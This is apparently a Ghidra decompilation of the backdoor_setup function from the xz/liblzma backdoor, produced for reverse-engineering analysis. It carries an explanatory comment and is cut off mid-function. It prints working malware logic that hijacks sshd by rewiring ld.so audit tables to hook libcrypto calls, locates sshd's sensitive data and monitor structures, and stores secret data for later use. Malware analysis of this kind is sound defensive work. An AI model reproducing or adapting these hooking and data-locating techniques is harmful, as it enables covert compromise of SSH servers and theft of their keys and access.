// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: unknown
// Prototype: undefined backdoor_setup(void)


/*
 * AutoDoc: The loader’s main workhorse. It snapshots the caller’s GOT/stack, builds a local
 * `backdoor_data_t` describing all observed modules, resolves sshd/libcrypto/liblzma/libc/ld.so
 * via `process_shared_libraries`, initialises the shared globals, and pulls in the
 * `backdoor_hooks_data_t` blob sitting inside liblzma. With those pieces it refreshes the
 * string-reference catalogue, configures the global context (payload buffers, sshd/log contexts,
 * import tables), runs the sensitive-data + sshd-metadata discovery routines, and finally rewires
 * ld.so’s audit tables so `backdoor_symbind64` is invoked for every sshd→libcrypto PLT call. On
 * success it copies the updated hook table back into liblzma and leaves the cpuid GOT slot ready
 * to resume execution.
 */
#include "xzre_types.h"


undefined1  [16] backdoor_setup(long param_1)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  undefined8 uVar3;
  int *piVar4;
  undefined4 uVar5;
  uint uVar6;
  undefined4 uVar7;
  BOOL bVar8;
  byte bVar9;
  byte bVar10;
  int iVar11;
  int iVar12;
  long lVar13;
  long *plVar14;
  long lVar15;
  long lVar16;
  long lVar17;
  long lVar18;
  long lVar19;
  undefined8 uVar20;
  long lVar21;
  ulong uVar22;
  ulong uVar23;
  long lVar24;
  ulong uVar25;
  undefined4 *puVar26;
  ulong uVar27;
  ulong uVar28;
  undefined1 *puVar29;
  undefined4 *puVar30;
  undefined4 *puVar31;
  ulong uVar32;
  byte bVar33;
  long lVar34;
  ulong uVar35;
  byte bVar36;
  int iVar37;
  code *pcVar38;
  undefined1 *puVar39;
  ulong uVar40;
  ulong local_b20;
  undefined4 *local_b10;
  undefined4 local_acc;
  long local_ac8;
  undefined8 local_ac0;
  undefined8 local_ab8;
  undefined8 local_ab0;
  undefined8 local_aa8;
  long local_aa0;
  ulong local_a98;
  long local_a90;
  undefined1 **local_a88;
  ulong local_a80;
  undefined8 *local_a78;
  undefined8 local_a70;
  long *local_a68;
  undefined1 **local_a60;
  undefined8 *local_a58;
  undefined8 *local_a50;
  undefined8 *local_a48;
  undefined8 local_a40;
  undefined1 *local_a38;
  long local_a30;
  long local_a28;
  undefined2 local_a20;
  byte local_a15;
  undefined4 local_a14;
  byte local_a10;
  uint local_a08;
  long local_a00;
  long local_9f0;
  long local_9d8;
  undefined4 local_9d0;
  undefined4 uStack_9cc;
  undefined2 local_9c8;
  char local_9bd;
  undefined4 local_9bc;
  byte local_9b8;
  ulong local_9a8;
  long local_998;
  long local_980 [3];
  long local_968;
  undefined1 *local_950;
  undefined1 *local_948;
  undefined1 *local_940;
  undefined1 *local_938;
  long *local_930;
  long *local_928;
  undefined1 **local_920;
  undefined1 local_918 [256];
  undefined1 local_818 [256];
  undefined1 local_718 [256];
  undefined1 local_618 [256];
  long local_518 [32];
  undefined1 local_418 [112];
  undefined1 local_3a8 [8];
  long alStack_3a0 [72];
  long local_160;
  undefined8 local_158;
  long local_80;
  ulong local_60;
  ulong local_58;
  undefined1 local_48 [24];
  long local_30;
  
  bVar36 = 0;
  local_acc = 0;
  plVar14 = local_980;
  for (lVar24 = 0x256; lVar24 != 0; lVar24 = lVar24 + -1) {
    *(undefined4 *)plVar14 = 0;
    plVar14 = (long *)((long)plVar14 + 4);
  }
  puVar29 = local_918;
  local_948 = local_818;
  local_940 = local_718;
  local_ac8 = 0;
  local_ac0 = 0;
  local_ab8 = 0;
  local_ab0 = 0;
  local_aa8 = 0;
  lVar24 = *(long *)(param_1 + 0x80);
  local_938 = local_618;
  local_930 = local_518;
  local_950 = puVar29;
  local_928 = local_980;
  local_920 = &local_950;
  update_got_address();
  if (*(long *)(lVar24 + 8) != 0) {
    uVar27 = *(ulong *)(*(long *)(lVar24 + 8) + 0x18 + *(long *)(lVar24 + 0x18) * 8);
    uVar32 = *(ulong *)(lVar24 + 0x28);
    lVar24 = uVar32 - uVar27;
    if (uVar32 <= uVar27) {
      lVar24 = uVar27 - uVar32;
    }
    if (lVar24 < 0x50001) {
      uVar27 = uVar27 & 0xfffffffffffff000;
      uVar32 = uVar27 - 0x20000;
LAB_00105951:
      iVar11 = get_string_id(uVar27,0);
      if (iVar11 != 0x300) goto code_r0x00105962;
      local_a78 = &local_aa8;
      local_a70 = *(undefined8 *)(*(long *)(param_1 + 0x80) + 0x28);
      local_a88 = &local_950;
      local_a80 = uVar27;
      iVar11 = main_elf_parse(&local_a88);
      if (iVar11 != 0) {
        local_30 = get_lzma_allocator(1);
        lVar24 = 0;
        do {
          local_48[lVar24] = *(undefined1 *)(local_30 + lVar24);
          lVar24 = lVar24 + 1;
        } while (lVar24 != 0x18);
        local_a58 = &local_ac0;
        local_a50 = &local_ab8;
        local_a48 = &local_ab0;
        local_a40 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x38);
        local_a68 = local_980;
        local_a60 = &local_950;
        local_a38 = local_418;
        iVar11 = process_shared_libraries(&local_a68);
        if (iVar11 == 0) goto LAB_00105a59;
        local_b10 = (undefined4 *)**(undefined8 **)(*(long *)(param_1 + 0x10) + 0x38);
        puVar26 = local_b10 + 0x4e;
        puVar31 = local_b10 + 0x146;
        puVar1 = local_b10 + 0xa8;
        puVar30 = puVar26;
        for (lVar24 = 0x5a; lVar24 != 0; lVar24 = lVar24 + -1) {
          *puVar30 = 0;
          puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
        }
        *(undefined4 **)(local_b10 + 0x5a) = puVar31;
        lVar24 = *(long *)(param_1 + 0x10);
        *(undefined4 **)(local_b10 + 0x50) = puVar1;
        *(undefined4 **)(local_b10 + 0x56) = local_b10 + 0xf2;
        plVar14 = *(long **)(lVar24 + 0x38);
        *(undefined4 **)(local_b10 + 0x52) = local_b10 + 0x12a;
        lVar24 = *plVar14;
        uVar20 = *(undefined8 *)(lVar24 + 0x580);
        *(undefined8 *)(local_b10 + 0x88) = 0;
        *(long *)(local_b10 + 0x8a) = lVar24 + 0x588;
        *(undefined8 *)(local_b10 + 0x86) = uVar20;
        elf_find_string_references(puVar29,local_3a8);
        local_aa0 = 0;
        lVar24 = elf_get_code_segment(local_938,&local_aa0);
        if (lVar24 != 0) {
          *(long *)(local_b10 + 0x6e) = lVar24;
          *(long *)(local_b10 + 0x70) = lVar24 + local_aa0;
          puVar30 = local_b10;
          for (lVar24 = 0x4e; lVar24 != 0; lVar24 = lVar24 + -1) {
            *puVar30 = 0;
            puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
          }
          lVar24 = *(long *)(param_1 + 0x10);
          *(undefined4 **)(local_b10 + 0x4a) = puVar1;
          uVar20 = *(undefined8 *)(lVar24 + 0x50);
          *(undefined8 *)(local_b10 + 0x44) = *(undefined8 *)(lVar24 + 0x48);
          uVar3 = *(undefined8 *)(*(long *)(param_1 + 8) + 8);
          *(undefined8 *)(local_b10 + 0x48) = uVar20;
          *(undefined8 *)(local_b10 + 0x46) = uVar3;
          puVar30 = local_b10 + 0xf2;
          for (lVar24 = 0x38; lVar24 != 0; lVar24 = lVar24 + -1) {
            *puVar30 = 0;
            puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
          }
          *(undefined8 *)(local_b10 + 0xf6) = **(undefined8 **)(param_1 + 8);
          uVar20 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78);
          *(undefined8 *)(local_b10 + 0xf8) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70);
          *(undefined8 *)(local_b10 + 0xfa) = uVar20;
          for (lVar24 = 0x1a; lVar24 != 0; lVar24 = lVar24 + -1) {
            *puVar31 = 0;
            puVar31 = puVar31 + (ulong)bVar36 * -2 + 1;
          }
          *(undefined8 *)(local_b10 + 0x15e) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x58);
          **(undefined8 **)(*(long *)(param_1 + 8) + 0x10) = puVar26;
          puVar31 = puVar1;
          for (lVar24 = 0x4a; lVar24 != 0; lVar24 = lVar24 + -1) {
            *puVar31 = 0;
            puVar31 = puVar31 + (ulong)bVar36 * -2 + 1;
          }
          *(undefined8 *)(local_b10 + 0xae) = local_ac0;
          *(undefined8 *)(local_b10 + 0xb0) = local_ab8;
          *(undefined8 *)(local_b10 + 0xb2) = local_ab0;
          lVar24 = 0;
          do {
            *(undefined1 *)((long)local_b10 + lVar24 + 0x4a8) = local_418[lVar24];
            lVar24 = lVar24 + 1;
          } while (lVar24 != 0x70);
          *(undefined4 **)(local_b10 + 0xee) = local_b10 + 0x12a;
          *(undefined8 *)(local_b10 + 0x144) = local_aa8;
          lVar24 = get_lzma_allocator(1);
          *(undefined1 **)(lVar24 + 0x10) = local_940;
          lVar13 = lzma_alloc(0x440,lVar24);
          *(long *)(local_b10 + 300) = lVar13;
          if (lVar13 != 0) {
            local_b10[0x12a] = local_b10[0x12a] + 1;
          }
          iVar11 = find_dl_audit_offsets(&local_928,&local_ac8,local_b10,puVar1);
          if (iVar11 == 0) goto LAB_00105a60;
          lVar13 = get_lzma_allocator(1);
          *(long **)(lVar13 + 0x10) = local_930;
          plVar14 = local_930;
          if (local_930 != (long *)0x0) {
            plVar14 = (long *)elf_symbol_get(local_930,0x798,0);
            lVar15 = lzma_alloc(0xaf8,lVar13);
            *(long *)(local_b10 + 0xc6) = lVar15;
            if (lVar15 != 0) {
              local_b10[0xf0] = local_b10[0xf0] + 1;
            }
          }
          local_a30 = 0;
          local_9d8 = 0;
          puVar29 = local_950;
          lVar15 = elf_get_code_segment(local_950,&local_a30);
          lVar34 = local_a30 + lVar15;
          lVar16 = elf_get_data_segment(puVar29,&local_9d8,0);
          *(long *)(local_b10 + 100) = lVar15;
          *(long *)(local_b10 + 0x66) = lVar34;
          *(long *)(local_b10 + 0x68) = lVar16;
          *(long *)(local_b10 + 0x6a) = local_9d8 + lVar16;
          lVar15 = get_elf_functions_address(3);
          if (((lVar15 == 0) || (pcVar38 = *(code **)(lVar15 + 0x20), pcVar38 == (code *)0x0)) ||
             (*(long *)(lVar15 + 0x30) == 0)) goto LAB_00105a60;
          lVar34 = 0;
          lVar16 = (*pcVar38)(local_930,0x418);
          *(long *)(local_b10 + 0xec) = lVar16;
          if (lVar16 != 0) {
            lVar34 = elf_symbol_get(local_930,0xc40,0);
          }
          local_acc = 0x2c8;
          lVar16 = elf_find_string(local_950,&local_acc,0);
          *(long *)(local_b10 + 0x5c) = lVar16;
          if (lVar16 == 0) goto LAB_00105a60;
          local_acc = 0x710;
          lVar16 = elf_find_string(local_950,&local_acc,0);
          *(long *)(local_b10 + 0x5e) = lVar16;
          if (lVar16 == 0) goto LAB_00105a60;
          lVar17 = 0;
          lVar16 = elf_symbol_get_addr(local_930,0x6d0);
          *(long *)(local_b10 + 0xe8) = lVar16;
          if (lVar16 != 0) {
            lVar16 = elf_symbol_get(local_930,0x958,0);
            if (lVar16 != 0) {
              lVar16 = *(long *)(lVar16 + 8);
              lVar17 = *local_930;
              local_b10[0xf0] = local_b10[0xf0] + 1;
              *(long *)(local_b10 + 0xde) = lVar16 + lVar17;
            }
            lVar17 = elf_symbol_get(local_930,0x918,0);
            if (*(long *)(local_b10 + 0xec) != 0) {
              local_b10[0xf0] = local_b10[0xf0] + 1;
            }
          }
          lVar16 = elf_symbol_get(local_930,0xac0,0);
          lVar18 = (*pcVar38)(local_930,0x540);
          lVar19 = 0;
          *(long *)(local_b10 + 0xe2) = lVar18;
          if (lVar18 != 0) {
            local_b10[0xf0] = local_b10[0xf0] + 1;
            lVar19 = elf_symbol_get(local_930,0x8f8,0);
            if (plVar14 != (long *)0x0) {
              lVar18 = plVar14[1];
              lVar21 = *local_930;
              local_b10[0xf0] = local_b10[0xf0] + 1;
              *(long *)(local_b10 + 0xc0) = lVar18 + lVar21;
            }
          }
          if (*(long *)(local_b10 + 0xe8) != 0) {
            local_b10[0xf0] = local_b10[0xf0] + 1;
          }
          iVar11 = sshd_find_sensitive_data(local_950,local_930,local_3a8,puVar1);
          if (iVar11 == 0) goto LAB_00105a60;
          if (lVar34 != 0) {
            lVar34 = *(long *)(lVar34 + 8);
            lVar18 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xe0) = lVar34 + lVar18;
          }
          if (lVar17 != 0) {
            lVar34 = *(long *)(lVar17 + 8);
            lVar17 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xdc) = lVar34 + lVar17;
          }
          if (lVar16 != 0) {
            lVar16 = *(long *)(lVar16 + 8);
            lVar34 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xea) = lVar16 + lVar34;
          }
          if (lVar19 != 0) {
            lVar16 = *(long *)(lVar19 + 8);
            lVar34 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xe6) = lVar16 + lVar34;
          }
          lVar34 = elf_symbol_get(local_930,0x3f0,0);
          uVar20 = 0;
          puVar2 = *(undefined8 **)(local_b10 + 0x56);
          local_a30 = 0;
          local_a98 = local_a98 & 0xffffffff00000000;
          *puVar2 = 0;
          *(undefined4 *)(puVar2 + 1) = 0;
          puVar29 = local_950;
          lVar17 = elf_get_data_segment(local_950,&local_a30,0);
          lVar16 = local_a30;
          if ((lVar17 != 0) && (local_160 != 0)) {
            puVar2[0x15] = local_160;
            puVar2[0x16] = local_158;
            local_a98 = CONCAT44(local_a98._4_4_,0x400);
            puVar39 = puVar29;
            lVar18 = elf_find_string(puVar29,&local_a98,0);
            puVar2[0x1a] = lVar18;
            if ((lVar18 != 0) &&
               (iVar11 = elf_find_function_pointer
                                   (0x16,puVar2 + 5,puVar2 + 6,puVar2 + 7,puVar39,local_3a8,puVar26,
                                    puVar29), iVar11 == 0)) {
              puVar2[5] = 0;
              puVar2[6] = 0;
              puVar2[7] = 0;
            }
            local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
            lVar18 = elf_find_string(puVar39,&local_a98,0);
            puVar2[0x1b] = lVar18;
            if (lVar18 != 0) {
              puVar29 = local_3a8;
              iVar11 = elf_find_function_pointer
                                 (0x17,puVar2 + 9,puVar2 + 10,puVar2 + 0xb,puVar39,puVar29,puVar26,
                                  lVar18,puVar39,puVar26,puVar29);
              if (iVar11 == 0) {
                puVar2[9] = 0;
                puVar2[10] = 0;
                puVar2[0xb] = 0;
              }
              else {
                iVar11 = elf_find_function_pointer
                                   (0x18,puVar2 + 0xd,puVar2 + 0xe,puVar2 + 0xf,puVar39,puVar29,
                                    puVar26,uVar20,puVar39,puVar26,puVar29);
                if (iVar11 == 0) {
                  puVar2[0xd] = 0;
                  puVar2[0xe] = 0;
                  puVar2[0xf] = 0;
                }
              }
            }
            if ((puVar2[5] != 0) || (puVar2[9] != 0)) {
              lVar18 = *(long *)(local_b10 + 0x56);
              local_9d8 = 0;
              lVar19 = *(long *)(lVar18 + 0x28);
              if (lVar19 == 0) {
                lVar19 = *(long *)(lVar18 + 0x48);
                if (lVar19 == 0) goto LAB_001065af;
                uVar20 = *(undefined8 *)(lVar18 + 0x50);
              }
              else {
                uVar20 = *(undefined8 *)(lVar18 + 0x30);
              }
              bVar8 = FALSE;
              lVar18 = 0;
              local_a90 = CONCAT44(local_a90._4_4_,0x198);
              while (lVar18 = elf_find_string(puVar39,&local_a90,lVar18), lVar18 != 0) {
                local_9d8 = 0;
                lVar21 = elf_find_rela_reloc(puVar39,lVar18,0,0,&local_9d8);
                if (lVar21 == 0) {
                  local_9d8 = 0;
                  bVar8 = TRUE;
                  lVar21 = elf_find_relr_reloc(puVar39,lVar18,0,0,&local_9d8);
                }
                while (lVar21 != 0) {
                  do {
                    iVar11 = elf_contains_vaddr_relro(puVar39,lVar21,8);
                    if ((iVar11 != 0) &&
                       (iVar11 = find_instruction_with_mem_operand_ex(lVar19,uVar20,0,0x109,lVar21),
                       iVar11 != 0)) {
                      lVar18 = puVar2[5];
                      *(long *)(*(long *)(local_b10 + 0x56) + 0xa0) = lVar21;
                      if (lVar18 != 0) {
                        *(undefined4 *)((long)puVar2 + 4) = 1;
                      }
                      if ((puVar2[9] != 0) && (*(undefined4 *)puVar2 = 1, puVar2[0xd] != 0)) {
                        *(undefined4 *)(puVar2 + 1) = 1;
                      }
                      lVar16 = lVar16 + lVar17;
                      lVar18 = find_addr_referenced_in_mov_instruction(0x11,local_3a8,lVar17,lVar16)
                      ;
                      if (lVar18 != 0) {
                        *(long *)(*(long *)(local_b10 + 0x56) + 0xc0) = lVar18;
                      }
                      plVar14 = &local_9d8;
                      bVar8 = FALSE;
                      local_9d0 = 0x70;
                      local_9d8 = 0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (bVar8) goto LAB_001063c8;
                    lVar21 = elf_find_rela_reloc(puVar39,lVar18,0,0,&local_9d8);
                  } while (lVar21 != 0);
                  local_9d8 = 0;
LAB_001063c8:
                  lVar21 = elf_find_relr_reloc(puVar39,lVar18,0,0,&local_9d8);
                  bVar8 = TRUE;
                }
                lVar18 = lVar18 + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (undefined4 *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  uVar27 = uVar27 - 0x1000;
  if (uVar27 == uVar32) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    lVar18 = elf_find_string(puVar39,plVar14,0);
    if (lVar18 != 0) {
      if (bVar8) {
        *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 1;
        goto LAB_001064b8;
      }
      bVar8 = TRUE;
    }
    plVar14 = (long *)((long)plVar14 + 4);
  } while (plVar14 != (long *)&uStack_9cc);
  *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 0;
LAB_001064b8:
  lVar16 = find_addr_referenced_in_mov_instruction(0x15,local_3a8,lVar17,lVar16);
  if (lVar16 != 0) {
    if ((*(int *)(*(long *)(local_b10 + 0x56) + 0xb8) != 0) && (local_b10[0x4e] != 0)) {
      iVar11 = 0;
      lVar17 = 0;
      local_9d0 = 0x10;
      local_9d8 = 0xf0000000e;
      uVar27 = 0;
      do {
        uVar32 = (ulong)*(uint *)((long)&local_9d8 + lVar17 * 4);
        lVar18 = alStack_3a0[uVar32 * 4];
        if (lVar18 != 0) {
          lVar19 = alStack_3a0[uVar32 * 4 + 1];
          iVar11 = iVar11 + 1;
          iVar12 = find_instruction_with_mem_operand(lVar18,lVar19,0,lVar16);
          iVar37 = (int)uVar27;
          if (iVar12 == 0) {
            iVar12 = find_add_instruction_with_mem_operand(lVar18,lVar19,0,lVar16);
            iVar37 = (int)uVar27;
            if (iVar12 == 0) goto LAB_0010658d;
          }
          uVar27 = (ulong)(iVar37 + 1);
        }
LAB_0010658d:
        lVar17 = lVar17 + 1;
      } while (lVar17 != 3);
      if ((iVar11 != 0) && ((int)uVar27 == 0)) goto LAB_001065af;
    }
    *(long *)(*(long *)(local_b10 + 0x56) + 200) = lVar16;
  }
LAB_001065af:
  lVar16 = elf_symbol_get(local_930,0x2a8,0);
  iVar11 = sshd_find_monitor_struct(local_950,local_3a8,puVar26);
  if (iVar11 == 0) {
    local_b10[0xf2] = 0;
    local_b10[0xf4] = 0;
  }
  puVar2 = *(undefined8 **)(local_b10 + 0x5a);
  *(undefined1 **)(lVar24 + 0x10) = local_940;
  local_a98 = 0;
  *puVar2 = 0;
  lVar24 = elf_get_code_segment(local_918,&local_a98);
  uVar27 = local_a98;
  if ((((lVar24 != 0) && (0x10 < local_a98)) && (local_80 != 0)) &&
     ((local_b10[0x4e] == 0 ||
      (iVar11 = is_endbr64_instruction(local_80,local_80 + 4,0xe230), iVar11 != 0)))) {
    puVar2[0xb] = local_80;
    plVar14 = &local_a30;
    for (lVar17 = 0x16; lVar17 != 0; lVar17 = lVar17 + -1) {
      *(undefined4 *)plVar14 = 0;
      plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
    }
    if (local_60 != 0) {
      local_b20 = 0;
      uVar35 = 0;
      uVar40 = local_58;
      uVar32 = local_60;
      do {
        while( TRUE ) {
          if ((uVar40 <= uVar32) || ((local_b20 != 0 && (uVar35 != 0)))) goto LAB_00106bf0;
          iVar11 = x86_dasm(&local_a30,uVar32,uVar40);
          if (iVar11 != 0) break;
          uVar32 = uVar32 + 1;
        }
        if ((local_a08 & 0xfffffffd) == 0xb1) {
          if (local_a14._1_1_ != '\x03') goto LAB_00106735;
          if ((local_a20 & 0x1040) == 0) {
            if ((local_a20 & 0x40) != 0) {
              bVar9 = 0;
LAB_001067cf:
              bVar33 = local_a14._3_1_;
              if ((local_a20 & 0x20) != 0) {
                bVar33 = local_a14._3_1_ | (local_a15 & 1) << 3;
              }
              goto LAB_001067ed;
            }
            bVar33 = 0;
          }
          else {
            if ((local_a20 & 0x40) != 0) {
              bVar9 = (byte)(local_a14 >> 0x10);
              if ((local_a20 & 0x20) != 0) {
                bVar9 = bVar9 | local_a15 * '\x02' & 8;
              }
              goto LAB_001067cf;
            }
            bVar33 = local_a20._1_1_ & 0x10;
            if ((local_a20 & 0x1000) == 0) goto LAB_001067fb;
            bVar9 = local_a10;
            if ((local_a20 & 0x20) != 0) {
              bVar9 = local_a10 | (local_a15 & 1) << 3;
            }
            bVar33 = 0;
LAB_001067ed:
            if (bVar9 != bVar33) goto LAB_00106735;
          }
LAB_001067fb:
          bVar9 = 0;
          uVar6 = 0;
          uVar35 = 0;
          uVar28 = 0;
          plVar14 = &local_9d8;
          for (lVar17 = 0x16; uVar23 = uVar32, lVar17 != 0; lVar17 = lVar17 + -1) {
            *(undefined4 *)plVar14 = 0;
            plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
          }
          for (; (uVar32 < uVar40 && (uVar6 < 5)); uVar6 = uVar6 + 1) {
            if ((uVar28 != 0) && (uVar35 != 0)) goto LAB_00106b3c;
            iVar11 = find_mov_instruction(uVar32,uVar40,1,0);
            if (iVar11 == 0) break;
            if ((local_9c8 & 0x1040) != 0) {
              if ((local_9c8 & 0x40) == 0) {
                bVar9 = local_9c8._1_1_ & 0x10;
                if (((local_9c8 & 0x1000) != 0) && (bVar9 = local_9b8, (local_9c8 & 0x20) != 0)) {
                  bVar10 = local_9bd << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                bVar9 = local_9bc._2_1_;
                if ((local_9c8 & 0x20) != 0) {
                  bVar10 = local_9bd * '\x02';
LAB_001068e4:
                  bVar9 = bVar9 | bVar10 & 8;
                }
              }
            }
            uVar32 = uVar35;
            if ((bVar33 == bVar9) && ((local_9c8 & 0x100) != 0)) {
              uVar25 = local_9a8;
              if ((local_9bc & 0xff00ff00) == 0x5000000) {
                uVar25 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
              }
              local_a90 = 0;
              uVar22 = elf_get_data_segment(local_918,&local_a90,0);
              if ((((uVar22 == 0) || (local_a90 + uVar22 <= uVar25)) || (uVar25 < uVar22)) ||
                 (((uVar25 == uVar35 && (uVar25 == uVar28)) || (uVar32 = uVar25, uVar28 != 0))))
              goto LAB_00106997;
            }
            else {
LAB_00106997:
              uVar25 = uVar28;
              uVar35 = uVar32;
            }
            uVar32 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
            uVar28 = uVar25;
          }
          if ((uVar28 == 0) || (uVar35 == 0)) {
LAB_00106ab1:
            uVar35 = 0;
            local_b20 = 0;
            uVar32 = uVar23;
          }
          else {
LAB_00106b3c:
            iVar11 = validate_log_handler_pointers(uVar28,uVar35,lVar24,lVar24 + uVar27);
            local_b20 = uVar28;
            uVar32 = uVar23;
            if (iVar11 != 0) {
              puVar2[7] = uVar28;
              puVar2[8] = uVar35;
              *(undefined4 *)((long)puVar2 + 4) = 1;
              local_9d8 = CONCAT44(local_9d8._4_4_,0x708);
              lVar24 = elf_find_string(local_918,&local_9d8,0);
              puVar2[2] = lVar24;
              if (lVar24 != 0) {
                local_9d8 = CONCAT44(local_9d8._4_4_,0x790);
                lVar24 = elf_find_string(local_918,&local_9d8,0);
                puVar2[3] = lVar24;
                if (lVar24 != 0) {
                  local_9d8 = CONCAT44(local_9d8._4_4_,0x4f0);
                  lVar24 = elf_find_string(local_918,&local_9d8,0);
                  puVar2[4] = lVar24;
                  if (lVar24 != 0) {
                    local_9d8 = CONCAT44(local_9d8._4_4_,0x1d8);
                    lVar24 = elf_find_string(local_918,&local_9d8,0);
                    puVar2[5] = lVar24;
                    if (lVar24 != 0) {
                      local_9d8 = CONCAT44(local_9d8._4_4_,0xb10);
                      lVar24 = elf_find_string(local_918,&local_9d8,0);
                      puVar2[6] = lVar24;
                      if (lVar24 != 0) break;
                    }
                  }
                }
              }
              *(undefined4 *)puVar2 = 1;
              break;
            }
          }
        }
        else if ((((local_a08 == 0x147) && (local_a14 >> 8 == 0x50000)) &&
                 ((local_a20 & 0x800) != 0)) && (local_9f0 == 0)) {
          uVar28 = 0;
          if ((local_a20 & 0x100) != 0) {
            uVar28 = local_a00 + local_a30 + local_a28;
          }
          local_9d8 = 0;
          uVar23 = elf_get_data_segment(local_918,&local_9d8,0);
          if (((uVar23 != 0) && (uVar28 < local_9d8 + uVar23)) && (uVar23 <= uVar28)) {
            plVar14 = &local_9d8;
            for (lVar17 = 0x16; uVar23 = uVar32, lVar17 != 0; lVar17 = lVar17 + -1) {
              *(undefined4 *)plVar14 = 0;
              plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
            }
            do {
              iVar11 = find_instruction_with_mem_operand_ex(uVar32,uVar40,&local_9d8);
              if (iVar11 == 0) break;
              if ((local_998 == 0) && ((local_9c8 & 0x100) != 0)) {
                uVar35 = local_9a8;
                if ((local_9bc & 0xff00ff00) == 0x5000000) {
                  uVar35 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
                }
                local_a90 = 0;
                uVar32 = elf_get_data_segment(local_918,&local_a90,0);
                if ((((uVar32 != 0) && (uVar35 < local_a90 + uVar32)) && (uVar32 <= uVar35)) &&
                   (uVar28 != uVar35)) goto LAB_00106b3c;
              }
              uVar32 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
            } while (uVar32 < uVar40);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        uVar32 = uVar32 + local_a28;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  *(long **)(lVar13 + 0x10) = local_930;
  if (lVar34 != 0) {
    lVar24 = *(long *)(lVar34 + 8);
    lVar34 = *local_930;
    local_b10[0xf0] = local_b10[0xf0] + 1;
    *(long *)(local_b10 + 0xd4) = lVar24 + lVar34;
  }
  if (lVar16 != 0) {
    lVar24 = *(long *)(lVar16 + 8);
    lVar16 = *local_930;
    local_b10[0xf0] = local_b10[0xf0] + 1;
    *(long *)(local_b10 + 0xd6) = lVar24 + lVar16;
  }
  iVar11 = init_imported_funcs(puVar1);
  if (((((((iVar11 != 0) &&
          (lzma_free(*(undefined8 *)(local_b10 + 0xc6),lVar13), local_b10[0x12a] == 0xc)) &&
         (iVar11 = secret_data_append_from_address(1,0x145,0x78,0x18), iVar11 != 0)) &&
        ((iVar11 = secret_data_append_from_address
                             (*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40),0x12a,4,0x12),
         iVar11 != 0 &&
         (iVar11 = secret_data_append_item
                             (0x12e,0x13,4,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x48)),
         iVar11 != 0)))) &&
       (iVar11 = secret_data_append_from_address
                           (*(undefined8 *)(*(long *)(param_1 + 8) + 8),0x132,6,0x14), iVar11 != 0))
      && ((iVar11 = secret_data_append_item
                              (0x138,0x15,2,0x10,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x50)),
          iVar11 != 0 &&
          (iVar11 = secret_data_append_item
                              (0xee,0x10,0x26,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70)
                              ), iVar11 != 0)))) &&
     ((iVar11 = secret_data_append_item
                          (0x140,0x17,5,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78)),
      iVar11 != 0 &&
      (((iVar11 = secret_data_append_item(0x13a,0x16,6,0x20,**(undefined8 **)(param_1 + 8)),
        iVar11 != 0 &&
        (iVar11 = secret_data_append_item(0x114,0x11,0x16,0x10,*(undefined8 *)(lVar15 + 0x30)),
        iVar11 != 0)) && (local_b10[0xa6] == 0x1c8)))))) {
    **(undefined8 **)(local_b10 + 0x3e) = local_b10;
    puVar26 = (undefined4 *)(local_980[0] + local_ac8 + 8);
    uVar5 = *puVar26;
    *(undefined4 **)(local_b10 + 0x14) = puVar26;
    local_b10[0x16] = uVar5;
    *puVar26 = 2;
    **(byte **)(local_b10 + 0x18) = **(byte **)(local_b10 + 0x18) | *(byte *)(local_b10 + 0x1a);
    puVar26 = (undefined4 *)(local_ac8 + 8 + local_968);
    uVar5 = *puVar26;
    *(undefined4 **)(local_b10 + 0x10) = puVar26;
    local_b10[0x12] = uVar5;
    *puVar26 = 1;
    puVar26 = local_b10 + 0x20;
    for (lVar24 = 0x1e; lVar24 != 0; lVar24 = lVar24 + -1) {
      *puVar26 = 0;
      puVar26 = puVar26 + (ulong)bVar36 * -2 + 1;
    }
    *(undefined8 *)(local_b10 + 0x28) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40);
    **(undefined8 **)(local_b10 + 0x1c) = local_b10 + 0x20;
    **(undefined4 **)(local_b10 + 0x1e) = 1;
    lVar13 = 0;
    lVar24 = local_30;
    while (lVar24 != 0) {
      *(undefined1 *)(local_30 + lVar13) = local_48[lVar13];
      lVar24 = lVar13 + -0x17;
      lVar13 = lVar13 + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  puVar29 = local_48;
